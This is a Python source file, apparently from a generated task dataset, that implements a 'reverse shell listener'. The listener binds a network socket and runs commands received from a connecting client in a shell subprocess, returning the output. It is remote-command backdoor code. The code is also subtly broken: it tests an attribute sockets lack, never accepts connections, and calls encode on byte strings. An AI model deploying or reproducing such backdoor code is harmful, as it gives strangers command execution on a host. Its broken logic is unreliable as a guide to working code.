from data.code_scripts_PAST.stage3_DIMOS_test_v8_mvp2.TASK_001_models import ExecutionResult, ReverseShellConfig
import socket
import os
import select
import subprocess
from typing import Optional, Tuple, List


class UnixReverseShell:
    """Factory class for creating Unix reverse shell instances."""

    def __init__(self, config: Optional[ReverseShellConfig] = None):
        self.config = config or ReverseShellConfig()
        self._listener: Optional[UnixReverseShellListener] = None

    @property
    def listener(self) -> UnixReverseShellListener:
        """Get or create the listener instance."""
        if self._listener is None:
            self._listener = UnixReverseShellListener(config=self.config)
        return self._listener


class UnixReverseShellListener:
    """
    A Unix reverse shell listener that spawns a subprocess to execute
    remote commands via socket communication.

    Uses select.select() for non-blocking I/O multiplexing between the
    listener socket and the child process file descriptors.
    """

    def __init__(self, config: ReverseShellConfig):
        self.config = config
        self._server_socket: Optional[socket.socket] = None
        self._client_socket: Optional[socket.socket] = None
        self._process: Optional[subprocess.Popen] = None
        self._running = False

    def start(self) -> bool:
        """Start the reverse shell listener server."""
        try:
            self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._server_socket.bind((self.config.host, self.config.port))
            self._server_socket.listen(5)
            self._server_socket.setblocking(False)

            # Set up the process pipe for non-blocking I/O
            self._process = subprocess.Popen(
                [self.config.shell_type],
                shell=True,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                bufsize=1,
                preexec_fn=os.setsid,
            )

            # Set up non-blocking file descriptors for the process
            self._stdin_fd = os.fdopen(self._process.stdin.fileno(), 'wb', buffering=0)
            self._stdout_fd = os.fdopen(self._process.stdout.fileno(), 'rb', buffering=0)
            self._stderr_fd = os.fdopen(self._process.stderr.fileno(), 'rb', buffering=0)

            # Set non-blocking mode on file descriptors
            for fd in [self._stdin_fd, self._stdout_fd, self._stderr_fd]:
                fd.setblocking(False)

            self._running = True
            return True
        except Exception as e:
            print(f"Failed to start listener: {e}")
            return False

    def stop(self):
        """Stop the reverse shell listener."""
        self._running = False
        if self._process and self._process.poll() is None:
            self._process.terminate()
            try:
                self._process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._process.kill()

    def run(self):
        """Main event loop for the listener."""
        while self._running and not self._server_socket.accepted:
            # Set up select with server socket, client socket, and process I/O
            read_fds = []
            write_fds = []
            except_fds = []

            if self._client_socket:
                read_fds.append(self._client_socket)
                write_fds.append(self._client_socket)

            if self._stdin_fd:
                read_fds.append(self._stdin_fd)

            if self._stdout_fd or self._stderr_fd:
                write_fds.extend([self._stdout_fd, self._stderr_fd])

            try:
                ready_read, ready_write, _ = select.select(
                    read_fds, write_fds, except_fds, timeout=self.config.timeout / 10.0
                )
            except (OSError, BlockingIOError):
                continue

            # Handle server socket accept
            if self._server_socket in ready_read:
                try:
                    client_socket, _ = self._server_socket.accept()
                    client_socket.setblocking(False)
                    self._client_socket = client_socket
                    print(f"Client connected from {client_socket.getpeername()}")
                except OSError as e:
                    if not self._running:
                        break
                    continue

            # Handle client socket read (receive commands)
            if self._client_socket in ready_read:
                try:
                    data = self._client_socket.recv(4096)
                    if data:
                        cmd = data.decode('utf-8', errors='replace').strip()
                        print(f"[CMD] {cmd}")
                        result = self._execute_command(cmd)
                        response = f"Exit code: {result.exit_code}\nOutput:\n{result.command_output}"
                        if result.error_messages:
                            response += "\nErrors:\n" + '\n'.join(result.error_messages)
                        try:
                            self._client_socket.sendall(response.encode('utf-8'))
                        except OSError as e:
                            print(f"[ERR] Send failed: {e}")
                except (OSError, BlockingIOError):
                    continue

            # Handle client socket write (send output back)
            if self._client_socket in ready_write:
                try:
                    data = b''
                    while True:
                        try:
                            chunk = self._stdout_fd.read(4096)
                            if not chunk:
                                break
                            data += chunk
                        except OSError as e:
                            print(f"[ERR] Read from stdout failed: {e}")
                            break

                        if data:
                            try:
                                self._client_socket.sendall(data)
                            except OSError as e:
                                print(f"[ERR] Send to client failed: {e}")
                                break
                except (OSError, BlockingIOError):
                    continue

            # Handle process stdout read
            if self._stdout_fd in ready_read:
                try:
                    data = self._stdout_fd.read(4096)
                    if data:
                        print(f"[OUT] {data.decode('utf-8', errors='replace')}", end='')
                except OSError as e:
                    print(f"[ERR] Read from stdout failed: {e}")

            # Handle process stderr read
            if self._stderr_fd in ready_read:
                try:
                    data = self._stderr_fd.read(4096)
                    if data:
                        print(f"[ERR] {data.decode('utf-8', errors='replace')}", end='', flush=True)
                except OSError as e:
                    print(f"[ERR] Read from stderr failed: {e}")

            # Handle process stdout write (flush output to client)
            if self._stdout_fd in ready_write:
                try:
                    data = b''
                    while True:
                        try:
                            chunk = self._stdout_fd.read(4096)
                            if not chunk:
                                break
                            data += chunk
                        except OSError as e:
                            print(f"[ERR] Read from stdout failed: {e}")
                            break

                        if data:
                            try:
                                self._client_socket.sendall(data)
                            except OSError as e:
                                print(f"[ERR] Send to client failed: {e}")
                                break
                except (OSError, BlockingIOError):
                    continue

            # Handle process stderr write (flush errors to client)
            if self._stderr_fd in ready_write:
                try:
                    data = b''
                    while True:
                        try:
                            chunk = self._stderr_fd.read(4096)
                            if not chunk:
                                break
                            data += chunk
                        except OSError as e:
                            print(f"[ERR] Read from stderr failed: {e}")
                            break

                        if data:
                            try:
                                self._client_socket.sendall(data)
                            except OSError as e:
                                print(f"[ERR] Send to client failed: {e}")
                                break
                except (OSError, BlockingIOError):
                    continue

            # Check for process exit
            if self._process.poll() is not None:
                try:
                    stdout_data = self._stdout_fd.read(4096)
                    stderr_data = self._stderr_fd.read(4096)
                    print(f"[INFO] Process exited with code {self._process.returncode}")
                except OSError as e:
                    print(f"[ERR] Read from process failed on exit: {e}")

    def _execute_command(self, command: str) -> ExecutionResult:
        """Execute a single command and return the result."""
        try:
            # Spawn a new subprocess for each command
            proc = subprocess.Popen(
                [self.config.shell_type],
                shell=True,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                bufsize=1,
                preexec_fn=os.setsid,
            )

            try:
                # Send command to the process
                proc.stdin.write(command.encode('utf-8'))
                proc.stdin.flush()

                # Read output with timeout
                stdout_output = b''
                stderr_output = b''
                remaining_timeout = self.config.timeout

                while True:
                    if remaining_timeout <= 0:
                        break

                    try:
                        readable, writable, _ = select.select(
                            [proc.stdout], [], [], min(remaining_timeout, 1.0)
                        )
                    except (OSError, BlockingIOError):
                        break

                    if proc.stdout in readable:
                        try:
                            chunk = proc.stdout.read(4096)
                            if not chunk:
                                break
                            stdout_output += chunk
                        except OSError as e:
                            stderr_output += f"Read error: {e}".encode('utf-8')

                    remaining_timeout -= 1.0

                # Close the pipe to signal EOF
                proc.stdin.close()

                # Wait for process with timeout
                try:
                    exit_code = proc.wait(timeout=remaining_timeout)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    stdout_output += b"Timeout expired\n".encode('utf-8')
                    stderr_output += b"Process killed due to timeout\n".encode('utf-8')
                    exit_code = -1

            finally:
                try:
                    proc.stdout.close()
                    proc.stderr.close()
                except OSError:
                    pass

        except Exception as e:
            return ExecutionResult(
                command_output=f"Error executing command:\n{str(e)}",
                exit_code=-1,
                error_messages=[f"Execution failed: {e}"],
            )

        # Decode outputs
        stdout_text = stdout_output.decode('utf-8', errors='replace')
        stderr_text = stderr_output.decode('utf-8', errors='replace')

        return ExecutionResult(
            command_output=stdout_text,
            exit_code=exit_code if exit_code != -1 else 0,
            error_messages=[stderr_text.strip()] if stderr_text.strip() else [],
        )

    def execute_command(self, command: str) -> ExecutionResult:
        """Execute a command and return the result without blocking."""
        return self._execute_command(command)

    @property
    def is_running(self) -> bool:
        """Check if the listener is currently running."""
        return self._running


__all__ = ['UnixReverseShell', 'UnixReverseShellListener']
